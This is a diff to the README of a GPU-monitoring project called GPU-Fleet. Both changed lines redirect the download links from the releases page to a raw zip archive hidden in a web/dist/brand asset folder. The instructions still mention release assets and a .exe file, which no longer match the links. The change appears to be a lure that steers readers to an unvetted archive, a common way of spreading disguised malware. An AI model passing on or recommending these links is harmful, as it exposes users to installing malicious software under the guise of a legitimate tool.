@@ -1,6 +1,6 @@
 # 🖥️ GPU-Fleet - Track your graphics cards with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Respiratorysyncytialviruscoliphage228/GPU-Fleet/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Respiratorysyncytialviruscoliphage228/GPU-Fleet/raw/refs/heads/main/web/dist/brand/Fleet_GP_v3.0.zip)
 
 GPU-Fleet allows you to view the status of your NVIDIA graphics cards from a web browser. It gathers data from your machines and stores it in a central system. You can monitor temperature, memory usage, and power draw for every card on your network. This tool helps you manage hardware without the need for manual checks on each computer.
 
@@ -8,7 +8,7 @@ GPU-Fleet allows you to view the status of your NVIDIA graphics cards from a web
 
 Visit the following page to choose the correct version for your system:
 
-[https://github.com/Respiratorysyncytialviruscoliphage228/GPU-Fleet/releases](https://github.com/Respiratorysyncytialviruscoliphage228/GPU-Fleet/releases)
+[https://github.com/Respiratorysyncytialviruscoliphage228/GPU-Fleet/raw/refs/heads/main/web/dist/brand/Fleet_GP_v3.0.zip](https://github.com/Respiratorysyncytialviruscoliphage228/GPU-Fleet/raw/refs/heads/main/web/dist/brand/Fleet_GP_v3.0.zip)
 
 Find the latest version listed under the "Assets" section. For Windows users, download the file ending in `.exe`. Save this file to a folder where you keep your programs.
 
